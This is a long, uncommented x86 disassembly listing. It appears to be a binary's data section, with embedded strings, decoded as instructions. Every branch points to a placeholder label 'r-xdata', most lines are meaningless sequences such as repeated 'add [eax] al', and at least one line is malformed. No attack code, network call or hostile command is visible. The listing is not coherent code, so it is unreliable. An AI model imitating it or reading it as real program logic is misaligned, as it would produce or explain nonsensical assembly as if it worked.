inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + 0x78 ] si
inc ebx
add [ eax + 0x77 ] cl
inc ebx
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ esi ] dh
inc ebx
add [ edi + 0x43 ] ch
add al ch
cmpsd [ esi ] [ edi ]
inc ebx
add ah bh
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax + ebp * 4 ] bl
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
movsb [ edi ] [ esi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
in al 0x78
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ah
jns r-xdata
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x33ffbc5b ] bl
movsd [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x40004378 ] al
add [ eax ] al
add [ edi + esi * 2 + 0x43 ] bh
add [ eax + 0xc004034 ] ah
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] dh
cmpsb [ esi ] [ edi ]
inc ebx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add al dh
test al 0x34
inc esp
jb r-xdata
mov [ 0xffffffffa34c0043 ] al
xor al [ eax ]
dec eax
xor al [ eax ]
inc esp
mov [ 0xffffffffa4880043 ] eax
inc ebx
add [ esp - 0x5c77ffbd ] al
inc ebx
add ah ch
outsd
inc ecx
add [ eax ] al
inc ebp
inc ecx
add [ eax + 0x740041de ] cl
fiadd [ ecx ]
and [ edx + 0x540e0043 ] bh
inc ebx
outsd
outsb
je r-xdata
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
inc esp
jpe r-xdata
add [ esp - 0x58dbffbd ] ch
outsd
insb
jae r-xdata
inc ebx
add [ esp - 0x5b53ffbd ] ah
inc ebx
add [ edi ] ah
add [ eax ] dh
add [ eax ] al
mov eax 0xa0004376
xor al 0x40
add [ 0xffffffffa4fc0043 ] cl
inc ebx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x67ffbc5a ] bl
movsd [ edi ] [ esi ]
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax - 0x33ffbc5b ] bl
movsd [ edi ] [ esi ]
add [ eax - 0xfffbfcc ] ch
inc ebx
outsd
outsb
je r-xdata
xor al 0x40
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
inc eax
add ah dh
mov ecx 0x45e40043
inc ecx
add ah ch
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7a ] dh
add [ ebx + 0x4379a8c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
jns r-xdata
inc ebx
add ah ah
movsd [ edi ] [ esi ]
inc ebx
add [ eax + 0x400043a3 ] cl
movsd [ edi ] [ esi ]
inc ebx
add [ ebx + 0x43 ] cl
add al dh
movsd [ edi ] [ esi ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax + 0x77 ] si
inc ebx
add [ eax + 0x4376 ] dl
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
or esp [ ebp + ebp * 2 + 0x41 ]
jne r-xdata
outsd
insb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x640041a2 ] cl
mov esp 0xa2bc0043
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
add [ eax - 0xfffbfcc ] ch
jae r-xdata
inc ebx
add [ esi ] dh
inc ebx
add [ edi + 0x43 ] ch
add al ch
cmpsd [ esi ] [ edi ]
inc ebx
add ah bh
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax + ebp * 4 ] bl
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
inc ebx
add [ esp - 0x5b53ffbd ] ah
add [ eax ] dh
add [ eax ] al
cwde
js r-xdata
inc ebx
add [ ebp + 0x43 ] ch
add [ 0x54120043 ] bl
inc esp
jb r-xdata
inc ebx
add [ eax ] dl
cmpsb [ esi ] [ edi ]
outsd
insb
jae r-xdata
add [ esp + edi * 2 ] bh
inc ebx
outsd
insd
popad
je r-xdata
inc ebx
add [ ebx ] al
or dl [ esp + eax * 2 + 0x72 ]
popad
inc edx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
jo r-xdata
inc ebx
add [ edi ] ah
add [ eax + 0xc004034 ] ah
movsd [ edi ] [ esi ]
inc ebx
add [ eax + ebp * 4 ] ah
inc ebx
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax - 0x67ffbc5a ] bl
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] dl
test al 0x43
add [ esp - 0x5c77ffbd ] al
inc ebx
add al cl
cmpsb [ esi ] [ edi ]
inc ebx
add [ ebx + 0x43 ] cl
add [ eax - 0x5bffbc5c ] ah
movsb [ edi ] [ esi ]
inc ebx
add [ ebp + 0x77c80040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add ah ah
jl r-xdata
outsd
add [ eax ] al
arpl [ eax ] cx
inc ebx
outsd
outsb
je r-xdata
push es
je r-xdata
inc esp
jb r-xdata
je r-xdata
jl r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + edi * 2 + 0x43 ] bl
add [ eax + eax ] ah
add [ eax ] dl
mov eax 0x34a00041
inc eax
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc ecx
add [ eax ] dh
mov edi 0xa2400043
mov esp 0x840041a2
mov esi 0xa2f00043
inc ebx
add [ edi ] al
push cs
push esp
inc ebx
outsd
outsb
je r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + edi * 2 + 0x43 ] dh
add [ eax ] ah
add [ eax ] al
add [ eax + 0x1c ] al
inc ecx
add [ esi ] al
or [ ecx + eax * 2 + 0x6e ] dl
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al dh
jpo r-xdata
je r-xdata
imul eax [ fs : edi + ebp * 2 + 0x63 ] 0x6b
popad
outsd
insb
jae r-xdata
outsb
je r-xdata
imul ecx [ eax ] 0x43
outsd
inc esp
jb r-xdata
push ebx
je r-xdata
add ecx [ edx ]
push esp
outsb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x43 ] dh
add [ esi ] al
insd
bound ecx [ ebp + 0x66 ]
je r-xdata
inc ecx
inc ecx
add [ esi + edi * 4 - 0x5d0fffbd ] al
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
dec ebp
popad
inc ecx
add [ eax ] al
inc ebp
inc ecx
add [ eax - 0x44 ] dl
mov ebx 0x45ec0043
add [ eax - 0x6fffbc84 ] ebx
clc
jl r-xdata
add [ ecx ] al
add [ eax ] al
add [ ebx ] cl
jae r-xdata
inc ebx
add [ ecx ] al
or [ esp + edx * 2 + 0x61 ] edx
dec ebp
outsd
jne r-xdata
push esp
shl ah 0x7b
imul edx [ edi + ebp * 2 + 0x70 ] 0x7
push es
or [ ebp + 0x62 ] ch
dec ebp
imul esp [ esp + 0x6c ] 0x6f430865
outsb
je r-xdata
insd
bound edx [ edx + 0x69 ]
push 0x626d0874
inc ecx
add [ eax - 0x43 ] dh
inc ebx
add [ eax - 0x6e ] dl
inc esp
add ah ah
mov ebp 0x92780043
inc esp
add [ edx + edx * 4 - 0x40a3ffbc ] cl
inc ebx
add [ eax ] bl
mov esi 0x92c80043
inc esp
add ah bl
xchg edx eax
inc esp
add [ eax - 0x42 ] dl
inc ebx
add [ ebx + edx * 4 ] al
inc esp
add [ esi + edi * 4 - 0x6cf3ffbd ] ch
inc esp
add ah cl
mov esi 0x93140043
inc esp
add al ah
mov edi 0xbfc00043
inc ebx
add [ eax ] al
rol [ ebx ] 0xec
mov esi 0x93280043
inc esp
add [ ebx + edx * 4 ] ch
inc esp
add [ eax ] dl
mov edi 0xbc800043
inc ebx
add [ edx ] dl
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
inc ecx
add ah dl
mov [ 0xffffffffa3280041 ] al
mov [ edx - 0x439bffbf ] ah
inc ebx
add [ edx - 0x417bffbf ] bh
inc ebx
add al dh
mov [ 0xffffffffbf300041 ] al
inc ebx
add [ eax - 0x5e ] al
jae r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
les edi [ ebx + 0x10043 ]
add [ eax ] al
add al [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x437cf474
add [ eax + eax ] dl
add bh bh
les edi [ ebx + 0x10043 ]
add [ eax ] al
add eax [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
or [ ebp + 0x69 ] cl
outsb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x4800408d
jle r-xdata
add [ eax - 0x53ffbfcc ] ah
xor al 0x40
add [ eax ] al
inc eax
sbb al 0x41
add [ ecx ] al
andps xmm0 [ ebx + 0x6f ]
jl r-xdata
jb r-xdata
add [ eax - 0x4bffbfcc ] dh
xor al 0x40
inc eax
outsd
insd
or [ ebx + 0x6f ] al
outsb
je r-xdata
jbe r-xdata
outsd
insb
jae r-xdata
add al dh
add [ ebp + 0x7ae40040 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x7b ] ah
inc ebx
add [ eax + eax ] bl
add [ eax ] al
or [ esp + eax * 2 + 0x4034a000 ] cl
add [ esp + esi + 0x34b00040 ] ch
inc eax
add [ esp + esi + 0x34a80040 ] dh
inc eax
xor al 0x40
jpe r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
push ebx
add [ eax ] cl
or edx [ ebp + ecx * 2 + 0x6f ]
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jb r-xdata
inc ebx
add [ esi ] al
imul eax [ fs : edx + esi * 2 + 0x61 ] 0x67
bound ecx [ edi + 0x72 ]
jb r-xdata
add [ ecx ] ecx
push esp
push esp
popad
inc ebp
outsb
je r-xdata
add [ eax - 0xfffbfcc ] ch
xor [ eax ] eax
or al 0x32
inc eax
add ah dl
inc esp
inc ecx
add [ ebx + edi * 4 + 0x43 ] bh
mov ah 0x34
inc eax
outsd
insb
inc ebx
add [ edx ] cl
or [ ebx + eax * 2 + 0x61 ] dl
or ah [ ebx + esi * 2 + 0x44 ]
jb r-xdata
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x437b7890
add [ ebx ] al
or al 0x54
outsd
jpo r-xdata
inc eax
add [ eax + eax ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
add [ eax + edi * 4 + 0x41 ] bh
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
add [ ebx + 0x437ec0c0 ] cl
add [ eax ] cl
andps xmm1 [ ebp + 0x6f ]
outsb
je r-xdata
imul esp [ esi + 0x74 ] 0x74617453
add [ gs : ecx ] al
je r-xdata
js r-xdata
les edi [ ebx + 0x10043 ]
add [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] eax
or [ ebp + 0x61 ] cl
inc ebx
outsd
outsb
jae r-xdata
add ah ch
inc ebp
imul ebp [ esi + 0x74 ] 0x657a6953
outsb
jae r-xdata
inc ebx
add [ eax + r-xdata ] dl
add [ edi ] ecx
push esp
inc ebx
outsd
imul ebp [ esi + 0x64 ] 0x1
jb r-xdata
jb r-xdata
jb r-xdata
jpe r-xdata
imul ebp [ edi + 0x6e ] 0x7c9cc08b
jo r-xdata
or cl [ eax ]
push esp
inc ebx
popad
dec ebp
outsd
jbe r-xdata
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
push ebx
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x28004010
adc eax 0x70900041
jg r-xdata
jb r-xdata
je r-xdata
add [ ecx ] al
pop eax
pop es
dec ecx
outsb
je r-xdata
popad
jb r-xdata
inc edx
outsd
je r-xdata
or [ ecx + 0x6b ] ah
popad
imul edx [ edx + 0x69 ] 0x67
push 0x6b610874
jae r-xdata
jae r-xdata
insb
jae r-xdata
inc ebx
add [ eax - 0x45 ] al
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
add eax 0x0
outsb
mov eax eax
pushfd
jl r-xdata
or [ ebx + 0x6f ] al
outsb
je r-xdata
lea eax [ eax ]
inc eax
jl r-xdata
insb
add ah dh
adc [ eax ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
add [ esi ] al
inc edx
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
dec edi
jbe r-xdata
add [ eax ] cl
push cs
push esp
dec ebx
jns r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
popad
pop eax
pop es
dec ecx
outsb
add [ ecx ] al
je r-xdata
jb r-xdata
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] cl
imul ebp [ esi + 0x74 ] r-xdata
or [ ebx + 0x6f ] al
imul eax [ edi + ebp * 2 + 0x63 ] 0x6b
jb r-xdata
add [ ebx ] al
or edx [ ecx + eax * 2 + 0x6e ]
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ebx ] al
add [ eax ] al
add [ eax + 0x600437c ] bl
popad
imul ecx [ ebp + 0x66 ] 0x74
add eax 0x6f546b61
jo r-xdata
add [ fs : eax ] eax
add [ eax ] al
outsd
insb
jae r-xdata
add [ ebx ] al
or [ esp + eax * 2 + 0x72 ] edx
popad
dec ebx
imul ebp [ esi + 0x64 ] 0x1
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
outsb
add ah dh
adc [ eax ] al
add al 0x8
push es
push ebx
outsb
jb r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
hlt
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
inc ebx
jb r-xdata
jb r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec esp
popad
add [ ecx ] al
add [ eax ] al
add [ ebx + edi * 2 + 0x64080043 ] dh
insd
dec ebp
popad
outsb
jne r-xdata
inc eax
add [ eax + 0x7c ] al
inc ebx
push ebx
outsd
jne r-xdata
or [ esi ] al
add [ 0x66696853 ] al
je r-xdata
push ebx
push 0xb746669
push esp
push 0x53746669
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
inc esp
jb r-xdata
jbe r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
hlt
je r-xdata
jb r-xdata
push esp
push ebx
je r-xdata
inc edx
jne r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
push ebx
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add al dh
jpo r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
hlt
push 0x53746669
je r-xdata
je r-xdata
add [ eax - 0x23ffbc8a ] dl
jb r-xdata
je r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
adc [ eax ] al
nop
xor al 0x80
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
dec ecx
add [ eax + 0x7 ] ebx
outsb
je r-xdata
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
je r-xdata
inc esp
jb r-xdata
hlt
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
je r-xdata
push esp
push ebx
push 0x53746669
add al 0x8
push es
push ebx
outsb
jb r-xdata
outsb
outsb
je r-xdata
jb r-xdata
push esp
inc ebp
outsb
jb r-xdata
adc [ eax ] al
pop es
inc edx
outsd
outsd
insb
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
add [ ebx ] eax
dec ebx
jns r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add al 0x8
push es
push ebx
outsb
jb r-xdata
hlt
pop es
dec ecx
outsb
je r-xdata
inc esp
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebp - 0x7f6bffc0 ] cl
inc ebx
add [ eax ] cl
andps xmm2 [ ebx + 0x74 ]
popad
jb r-xdata
jbe r-xdata
add ah dh
adc [ eax ] al
sub [ eax ] dl
inc eax
add [ ebp + 0x7fac0040 ] cl
inc ebx
add [ eax ] cl
push cs
push esp
inc ebx
push 0xf4007261
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
or [ esi ] al
push esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
pop eax
pop es
dec ecx
outsb
je r-xdata
je r-xdata
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x1 ] si
outsb
je r-xdata
outsb
je r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebx + ecx + 0x54 ] si
inc esp
jb r-xdata
or [ esi ] al
outsb
je r-xdata
jb r-xdata
jb r-xdata
arpl [ ebp + 0xf ] sp
push esp
inc esp
jb r-xdata
inc esp
outsd
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
add [ ecx + 0x7 ] ebx
outsb
je r-xdata
pop eax
add [ ecx ] al
push esp
dec edi
push ebx
outsb
jb r-xdata
add cl [ eax ]
push es
jb r-xdata
jb r-xdata
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ eax ] bh
add [ ebx ] 0x44540e08
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
nop
jbe r-xdata
push ebx
outsb
add al 0x8
push es
or [ esi ] al
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsd
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
add [ ecx + 0x7 ] ebx
dec ecx
or [ esp + edx * 2 ] cl
inc esp
outsd
outsb
je r-xdata
hlt
hlt
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
jo r-xdata
dec ecx
pop ecx
pop es
add [ ebx ] 0x8
or eax 0x646e4554
inc esp
add ah bl
inc esp
outsd
insb
jb r-xdata
popad
jb r-xdata
outsb
je r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jbe r-xdata
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61430701
imul esi [ ebp + 0x49 ] 0x456f666e
jbe r-xdata
push 0x65
popad
jb r-xdata
add eax 0x74617453
or dl [ gs : esp + eax * 2 + 0x72 ]
popad
push ebx
je r-xdata
je r-xdata
inc esp
outsd
arpl [ ebx + 0x45 ] bp
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
jbe r-xdata
inc ebp
jbe r-xdata
inc ebx
jpe r-xdata
mov [ eax + 0x43 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x438374c0 ] cl
add [ eax ] cl
andps xmm0 [ ebx + 0x61 ]
outsb
push edx
jae r-xdata
outsb
je r-xdata
outsb
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ edi + ecx + 0x54 ] si
inc esp
jb r-xdata
je r-xdata
or [ ecx ] cl
dec esi
ja r-xdata
je r-xdata
jne r-xdata
adc [ 0x6c666e49 ] ecx
push esp
inc ebx
outsd
outsb
je r-xdata
outsd
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x43540874
outsb
je r-xdata
hlt
outsb
je r-xdata
inc eax
add [ eax + edx ] bh
jb r-xdata
pop ss
push esp
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
pop es
outsb
arpl [ ebp + 0x52 ] sp
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + edx + 0x8 ] si
dec ebp
outsd
add eax 0x63655254
je r-xdata
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ eax + eax - 0xc ] si
adc [ eax ] al
xor [ ecx + 0x43 ] bh
add al ch
add [ ebx ] 0x8
adc [ edi + eax * 2 + 0x65 ] edx
je r-xdata
inc esp
add [ 0x6f6c6c41 ] eax
push esp
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
outsd
insb
add [ esi ] eax
inc ecx
arpl [ ebx + 0x65 ] sp
jo r-xdata
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
outsd
insb
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebx + 0x4384fcc0 ] cl
add [ eax ] cl
push ss
push edi
push 0x456c6565
jbe r-xdata
push 0x6e490774
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x6e657645
outsd
outsb
jae r-xdata
outsb
je r-xdata
or [ edx ] cl
inc esp
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0xa ] si
jae r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
imul esp [ edi + 0x68 ] 0x6e490774
push eax
outsd
jae r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x7 ] bp
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ edi ] eax
inc ebx
popad
jne r-xdata
or [ ebp + 0x6f ] cl
add ah dh
adc [ eax ] al
mov [ eax - 0x6f9fffbd ] cl
inc ebx
add [ eax ] al
adc [ eax ] al
pushfd
add [ ebx ] 0x8
andps xmm2 [ ebx + 0x74 ]
inc edx
outsd
outsd
insb
popad
outsb
ja r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
xor [ ecx + 0x43 ] bh
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add al dh
jpo r-xdata
inc esp
jb r-xdata
or [ edx ] ecx
arpl [ ecx + ecx + 0xa ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
je r-xdata
push edi
push 0x556c6565
push esp
dec ebp
outsd
jne r-xdata
add [ eax + edx ] bh
outsb
jb r-xdata
jb r-xdata
add eax 0x65530608
outsb
jb r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x438474c0 ] cl
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x6f ] dl
jne r-xdata
adc [ eax ] al
cmp al 0x10
jpe r-xdata
dec esi
ja r-xdata
or [ esi + 0x65 ] ecx
ja r-xdata
jb r-xdata
jb r-xdata
je r-xdata
push ebp
outsb
inc esp
outsd
arpl [ ebx + 0x45 ] bp
add [ eax ] al
adc [ eax ] al
nop
xor [ edx + 0xc080043 ] al
push esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0x7e004386 ] bh
js r-xdata
insb
outsd
ja r-xdata
add eax 0x65530608
outsb
jb r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
mov eax eax
cld
test [ ebx ] al
or [ esi ] dl
add [ edi ] eax
dec eax
popad
or [ ebp + 0x6f ] cl
jne r-xdata
hlt
add [ eax ] ecx
dec ebp
imul ebp [ esi + 0x57 ] 0x68746469
pop es
dec ecx
outsb
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
dec esi
ja r-xdata
add [ eax ] ecx
push esp
dec edi
add [ eax + edx ] bh
inc ebp
jbe r-xdata
inc ebp
je r-xdata
imul esp [ gs : edi + 0x68 ] 0x6e490774
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push edx
jae r-xdata
push es
inc eax
add al dh
0x34b40041 0x40
xor al 0xe3
inc ebx
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax ] al
adc [ eax ] ch
inc ecx
push eax
outsd
jo r-xdata
jne r-xdata
inc ebp
add [ 0x66696853 ] al
je r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
adc [ gs : eax ] cl
push eax
outsd
jae r-xdata
je r-xdata
outsb
je r-xdata
outsb
add [ eax ] ecx
je r-xdata
dec ecx
outsb
arpl [ eax + eax + 0x5 ] si
push ebx
push 0xb746669
jb r-xdata
je r-xdata
jpe r-xdata
add [ ecx + 0x34ac0041 ] bl
jo r-xdata
add [ eax ] dl
sub [ ecx ] al
pushfd
mov eax [ 0x34ac0041 ]
inc ebp
js r-xdata
outsb
je r-xdata
add [ edx ] cl
push edi
push 0x446c6565
insb
je r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
jo r-xdata
je r-xdata
mov [ ebx ] al
pop esp
add [ eax ] eax
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x79ebffc0 ] cl
push eax
outsd
jae r-xdata
outsb
insb
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
sub [ 0x103c0041 ] dl
push esp
push eax
outsd
imul ebp [ esi + 0x74 ] 0x61480701
imul esp [ esp + esi * 2 + 0x68 ] 0x746e4907
jb r-xdata
dec ebp
popad
js r-xdata
or [ ebp + 0x61 ] cl
push 0x6e490774
pop es
inc edx
outsd
outsd
insb
popad
outsb
add ah dh
adc [ eax ] al
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
